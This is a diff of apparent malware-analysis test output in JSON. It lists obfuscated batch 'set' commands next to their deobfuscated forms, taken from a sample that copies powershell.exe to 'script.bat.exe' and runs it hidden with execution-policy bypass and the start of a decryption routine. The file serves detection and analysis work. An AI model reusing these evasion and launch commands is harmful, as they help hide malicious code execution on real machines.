+            "Command": "%CuYg%\"NBEShZVxdI%KWxq%RuXS\"",
+            "Normalized": "set \"NBEShZVxdI=RuXS\""
+          },
+          {
+            "Command": "%CuYg%\"qVQbOHyMQg%KWxq%= Ne\"",
+            "Normalized": "set \"qVQbOHyMQg== Ne\""
+          },
+          {
+            "Command": "%CuYg%\"KTzJwfHoTA%KWxq%byte\"",
+            "Normalized": "set \"KTzJwfHoTA=byte\""
+          },
+          {
+            "Command": "%CuYg%\"pznkrkYcSg%KWxq%46es\"",
+            "Normalized": "set \"pznkrkYcSg=46es\""
+          },
+          {
+            "Command": "%CuYg%\"WpbgaGlUgP%KWxq%k);}\"",
+            "Normalized": "set \"WpbgaGlUgP=k);}\""
+          },
+          {
+            "Command": "%CuYg%\"zsgzvBksnU%KWxq%ypto\"",
+            "Normalized": "set \"zsgzvBksnU=ypto\""
+          },
+          {
+            "Command": "%CuYg%\"YeDLTjgsYc%KWxq%lit(\"",
+            "Normalized": "set \"YeDLTjgsYc=lit(\""
+          },
+          {
+            "Command": "%CuYg%\"evHTLasVFk%KWxq%\"%~0.\"",
+            "Normalized": "set \"evHTLasVFk=\"script.bat.\""
+          },
+          {
+            "Command": "%CuYg%\"atqNdyhGqZ%KWxq% -no\"",
+            "Normalized": "set \"atqNdyhGqZ= -no\""
+          },
+          {
+            "Command": "%CuYg%\"rQikqWbgZL%KWxq%grap\"",
+            "Normalized": "set \"rQikqWbgZL=grap\""
+          },
+          {
+            "Command": "%CuYg%\"rdRvdGyZCw%KWxq%YwYY\"",
+            "Normalized": "set \"rdRvdGyZCw=YwYY\""
+          },
+          {
+            "Command": "%CuYg%\"kIfMnpvQvj%KWxq%$fzu\"",
+            "Normalized": "set \"kIfMnpvQvj=$fzu\""
+          },
+          {
+            "Command": "%CuYg%\"uDUOhlPuyE%KWxq%.Inv\"",
+            "Normalized": "set \"uDUOhlPuyE=.Inv\""
+          },
+          {
+            "Command": "%CuYg%\"BisBCfewMw%KWxq%nirt\"",
+            "Normalized": "set \"BisBCfewMw=nirt\""
+          },
+          {
+            "Command": "%CuYg%\"qYhLNpeVWc%KWxq%L.Mo\"",
+            "Normalized": "set \"qYhLNpeVWc=L.Mo\""
+          },
+          {
+            "Command": "%CuYg%\"mHrINttEHj%KWxq%z58e\"",
+            "Normalized": "set \"mHrINttEHj=z58e\""
+          },
+          {
+            "Command": "%CuYg%\"qMwQKbLBlt%KWxq%_var\"",
+            "Normalized": "set \"qMwQKbLBlt=_var\""
+          },
+          {
+            "Command": "%CuYg%\"gcMGNTCuio%KWxq%GzhX\"",
+            "Normalized": "set \"gcMGNTCuio=GzhX\""
+          },
+          {
+            "Command": "%CuYg%\"fAGhKJjPYY%KWxq%VH.E\"",
+            "Normalized": "set \"fAGhKJjPYY=VH.E\""
+          },
+          {
+            "Command": "%CuYg%\"KsXQJEHwxs%KWxq%t;$W\"",
+            "Normalized": "set \"KsXQJEHwxs=t;$W\""
+          },
+          {
+            "Command": "%CuYg%\"AdBuzCgwLW%KWxq%phy.\"",
+            "Normalized": "set \"AdBuzCgwLW=phy.\""
+          },
+          {
+            "Command": "%CuYg%\"RvdSghNJoz%KWxq%4NiL\"",
+            "Normalized": "set \"RvdSghNJoz=4NiL\""
+          },
+          {
+            "Command": "%CuYg%\"rHWVsfIbGl%KWxq%hy.C\"",
+            "Normalized": "set \"rHWVsfIbGl=hy.C\""
+          },
+          {
+            "Command": "%CuYg%\"jPiqZkTOYC%KWxq%o){$\"",
+            "Normalized": "set \"jPiqZkTOYC=o){$\""
+          },
+          {
+            "Command": "%CuYg%\"kEDvfGsftM%KWxq%o($e\"",
+            "Normalized": "set \"kEDvfGsftM=o($e\""
+          },
+          {
+            "Command": "%CuYg%\"DloeezSPDD%KWxq%nver\"",
+            "Normalized": "set \"DloeezSPDD=nver\""
+          },
+          {
+            "Command": "%CuYg%\"hZhqrbwjuw%KWxq%EcC.\"",
+            "Normalized": "set \"hZhqrbwjuw=EcC.\""
+          },
+          {
+            "Command": "%CuYg%\"OCoqkbuCvf%KWxq%$iXJ\"",
+            "Normalized": "set \"OCoqkbuCvf=$iXJ\""
+          },
+          {
+            "Command": "%CuYg%\"yKhkkoaPLt%KWxq%iXJI\"",
+            "Normalized": "set \"yKhkkoaPLt=iXJI\""
+          },
+          {
+            "Command": "%CuYg%\"EjCgKDfBav%KWxq%n.As\"",
+            "Normalized": "set \"EjCgKDfBav=n.As\""
+          },
+          {
+            "Command": "%CuYg%\"VmevwsjypK%KWxq%xbkw\"",
+            "Normalized": "set \"VmevwsjypK=xbkw\""
+          },
+          {
+            "Command": "%CuYg%\"zbeBEcMaHg%KWxq%d[0]\"",
+            "Normalized": "set \"zbeBEcMaHg=d[0]\""
+          },
+          {
+            "Command": "%CuYg%\"hkbSDrBUyE%KWxq%mpre\"",
+            "Normalized": "set \"hkbSDrBUyE=mpre\""
+          },
+          {
+            "Command": "%CuYg%\"eOCHWxBEEF%KWxq%iXJI\"",
+            "Normalized": "set \"eOCHWxBEEF=iXJI\""
+          },
+          {
+            "Command": "%CuYg%\"jOJYiHiMaP%KWxq%pVA \"",
+            "Normalized": "set \"jOJYiHiMaP=pVA \""
+          },
+          {
+            "Command": "%CuYg%\"uPboHFkZhf%KWxq%.IO.\"",
+            "Normalized": "set \"uPboHFkZhf=.IO.\""
+          },
+          {
+            "Command": "%CuYg%\"rgGVyeMfUI%KWxq% '')\"",
+            "Normalized": "set \"rgGVyeMfUI= '')\""
+          },
+          {
+            "Command": "%CuYg%\"kerdOYGyEy%KWxq%em.C\"",
+            "Normalized": "set \"kerdOYGyEy=em.C\""
+          },
+          {
+            "Command": "%CuYg%\"pbjIMoEeHU%KWxq%rF'[\"",
+            "Normalized": "set \"pbjIMoEeHU=rF'[\""
+          },
+          {
+            "Command": "%CuYg%\"tVUgTIRgVc%KWxq%= $c\"",
+            "Normalized": "set \"tVUgTIRgVc== $c\""
+          },
+          {
+            "Command": "%CuYg%\"GpxhghKzri%KWxq%stem\"",
+            "Normalized": "set \"GpxhghKzri=stem\""
+          },
+          {
+            "Command": "%CuYg%\"BxyInuZyue%KWxq%]] (\"",
+            "Normalized": "set \"BxyInuZyue=]] (\""
+          },
+          {
+            "Command": "%CuYg%\"QKIpkNFaYl%KWxq%knKV\"",
+            "Normalized": "set \"QKIpkNFaYl=knKV\""
+          },
+          {
+            "Command": "%CuYg%\"PzsbrKfqot%KWxq%w-Ob\"",
+            "Normalized": "set \"PzsbrKfqot=w-Ob\""
+          },
+          {
+            "Command": "%CuYg%\"OBayzYSZja%KWxq%New-\"",
+            "Normalized": "set \"OBayzYSZja=New-\""
+          },
+          {
+            "Command": "%CuYg%\"NRaEzBwAGM%KWxq%XTgj\"",
+            "Normalized": "set \"NRaEzBwAGM=XTgj\""
+          },
+          {
+            "Command": "%CuYg%\"hNVTHeyqvd%KWxq%L.Cr\"",
+            "Normalized": "set \"hNVTHeyqvd=L.Cr\""
+          },
+          {
+            "Command": "%CuYg%\"XPjexZLyxd%KWxq%..-1\"",
+            "Normalized": "set \"XPjexZLyxd=..-1\""
+          },
+          {
+            "Command": "%CuYg%\"QqkNyVJNCQ%KWxq%tem.\"",
+            "Normalized": "set \"QqkNyVJNCQ=tem.\""
+          },
+          {
+            "Command": "%CuYg%\"FTuXThQoXh%KWxq%in '\"",
+            "Normalized": "set \"FTuXThQoXh=in '\""
+          },
+          {
+            "Command": "%CuYg%\"sctdkDksKr%KWxq%.-16\"",
+            "Normalized": "set \"sctdkDksKr=.-16\""
+          },
+          {
+            "Command": "%CuYg%\"bGOLpfDsPR%KWxq%urit\"",
+            "Normalized": "set \"bGOLpfDsPR=urit\""
+          },
+          {
+            "Command": "%CuYg%\"DAKKRhWUKT%KWxq%ss);\"",
+            "Normalized": "set \"DAKKRhWUKT=ss);\""
+          },
+          {
+            "Command": "%CuYg%\"gErzezjFdP%KWxq%FNAo\"",
+            "Normalized": "set \"gErzezjFdP=FNAo\""
+          },
+          {
+            "Command": "%CuYg%\"OqPCQSUtoR%KWxq%y = \"",
+            "Normalized": "set \"OqPCQSUtoR=y = \""
+          },
+          {
+            "Command": "%CuYg%\"RMiopvhpPa%KWxq%File\"",
+            "Normalized": "set \"RMiopvhpPa=File\""
+          },
+          {
+            "Command": "%CuYg%\"qWepMcVmxx%KWxq%gnir\"",
+            "Normalized": "set \"qWepMcVmxx=gnir\""
+          },
+          {
+            "Command": "%CuYg%\"AnHpRhwdky%KWxq%S7;$\"",
+            "Normalized": "set \"AnHpRhwdky=S7;$\""
+          },
+          {
+            "Command": "%CuYg%\"GWLRMtDBPJ%KWxq%k; }\"",
+            "Normalized": "set \"GWLRMtDBPJ=k; }\""
+          },
+          {
+            "Command": "%CuYg%\"lfDQIhpRNh%KWxq%yste\"",
+            "Normalized": "set \"lfDQIhpRNh=yste\""
+          },
+          {
+            "Command": "%CuYg%\"jdsVbiYTVx%KWxq%)('6\"",
+            "Normalized": "set \"jdsVbiYTVx=)('6\""
+          },
+          {
+            "Command": "%CuYg%\"xRAaDtnJUv%KWxq%$ret\"",
+            "Normalized": "set \"xRAaDtnJUv=$ret\""
+          },
+          {
+            "Command": "%CuYg%\"cyQAbRrNAA%KWxq%mFNA\"",
+            "Normalized": "set \"cyQAbRrNAA=mFNA\""
+          },
+          {
+            "Command": "%CuYg%\"lNiImCmnFg%KWxq%FNAo\"",
+            "Normalized": "set \"lNiImCmnFg=FNAo\""
+          },
+          {
+            "Command": "%CuYg%\"ZndraMngRT%KWxq%ly]:\"",
+            "Normalized": "set \"ZndraMngRT=ly]:\""
+          },
+          {
+            "Command": "%CuYg%\"LxiuJZQePD%KWxq%);}f\"",
+            "Normalized": "set \"LxiuJZQePD=);}f\""
+          },
+          {
+            "Command": "%CuYg%\"QtUghqzKzW%KWxq%urit\"",
+            "Normalized": "set \"QtUghqzKzW=urit\""
+          },
+          {
+            "Command": "%CuYg%\"aBmVnzULHT%KWxq%Star\"",
+            "Normalized": "set \"aBmVnzULHT=Star\""
+          },
+          {
+            "Command": "%CuYg%\"PSGObflUoQ%KWxq%Syst\"",
+            "Normalized": "set \"PSGObflUoQ=Syst\""
+          },
+          {
+            "Command": "%CuYg%\"ufCWrlvluF%KWxq%ewLi\"",
+            "Normalized": "set \"ufCWrlvluF=ewLi\""
+          },
+          {
+            "Command [trunc]": "%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi",
+            "Normalized [trunc]": "\"script.bat.exe\" -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object Syste"
+          },
+          {
+            "Command": "%CuYg%\"zCgJWixVBh%KWxq% /b\"",
+            "Normalized": "set \"zCgJWixVBh= /b\""
+          },
+          {
+            "Command": "%CuYg%\"evHTLasVFk%KWxq%exit\"",
+            "Normalized": "set \"evHTLasVFk=exit\""
+          },
+          {
+            "Command": "%evHTLasVFk%%zCgJWixVBh%",
+            "Normalized": "exit /b"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Command",
@@ -23,13 +1708,25 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Execution of variable content",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Count\": 18, \"Command [trunc]\": \"%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi\", \"Normalized\": \"copy C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /y \\\"script.bat.exe\\\"\"}, {\"Count\": 393, \"Command [trunc]\": \"%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi\", \"Normalized [trunc]\": \"\\\"script.bat.exe\\\" -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object Syste\"}]",
+        "body": [
+          {
+            "Command [trunc]": "%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi",
+            "Count": 18,
+            "Normalized": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y \"script.bat.exe\""
+          },
+          {
+            "Command [trunc]": "%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi",
+            "Count": 393,
+            "Normalized [trunc]": "\"script.bat.exe\" -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object Syste"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Count",
@@ -48,13 +1745,20 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Multiple variable were used on the same line",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Source\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"Destination\": \"\\\"script.bat.exe\\\"\", \"Command\": \"copy C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /y \\\"script.bat.exe\\\"\"}]",
+        "body": [
+          {
+            "Command": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y \"script.bat.exe\"",
+            "Destination": "\"script.bat.exe\"",
+            "Source": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Source",
@@ -73,6 +1777,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {
           "dynamic": {
             "process": {
@@ -87,7 +1792,12 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Filename\": \"\\\"script.bat.exe\\\"\", \"Command [trunc]\": \"\\\"script.bat.exe\\\" -noprofile -w hidden -ep bypass -c function fbeoh($mfnao){$ixjil = new-object syste\"}]",
+        "body": [
+          {
+            "Command [trunc]": "\"script.bat.exe\" -noprofile -w hidden -ep bypass -c function fbeoh($mfnao){$ixjil = new-object syste",
+            "Filename": "\"script.bat.exe\""
+          }
+        ],
         "body_config": {
           "column_order": [
             "Filename",
@@ -105,6 +1815,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Execution of manipulated content",
         "zeroize_on_tag_safe": false
